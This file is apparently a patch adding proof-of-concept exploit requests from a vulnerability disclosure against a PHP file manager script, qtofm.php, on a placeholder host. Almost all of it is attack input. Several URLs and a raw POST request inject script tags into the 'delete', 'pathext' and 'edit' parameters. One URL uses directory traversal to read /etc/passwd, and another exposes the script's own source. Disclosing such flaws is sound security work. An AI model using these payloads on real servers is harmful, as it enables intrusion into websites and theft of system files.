@@ -1,0 +1,16 @@
+http://target.xx/qtofm.php?delete=%3Cscript%3Ealert(%22Ellipsis%20Security%20Test%22)%3C/script%3E&amp;u=[username]&amp;pathext=1
+http://target.xx/qtofm.php?delete=COPYING&amp;u=[username]&amp;pathext=%3Cscript%3Ealert(%22Ellipsis%20Security%20Test%22)%3C/script%
+
+3E
+http://target.xx/qtofm.php?u=[username]&amp;pathext=%3Cscript%3Ealert(%22Ellipsis%20Security%20Test%22)%3C/script%3E&amp;edit=1
+http://target.xx/qtofm.php?u=[username]&amp;pathext=1&amp;edit=%3Cscript%3Ealert(%22Ellipsis%20Security%20Test%22)%3C/script%3E
+---
+POST http://target.xx:80/qtofm.php?u=[username]&amp;pathext=1&amp;edit=readme%2Etxt HTTP/1.0
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Host: target.xx
+Content-Length: 117
+u=[username]&amp;pathext=%3Cscript%3Ealert(%22Ellipsis%20Security%20Test%22)%3C/script%3E&amp;newcontent=1&amp;save=Save&amp;savefile=1
+--------
+http://target.xx/qtofm.php?edit=../../../../../../../../../../../../etc/passwd&amp;u=[username]&amp;pathext=
+http://target.xx/qtofm.php?edit=qtofm.php&amp;u=[username]&amp;pathext=
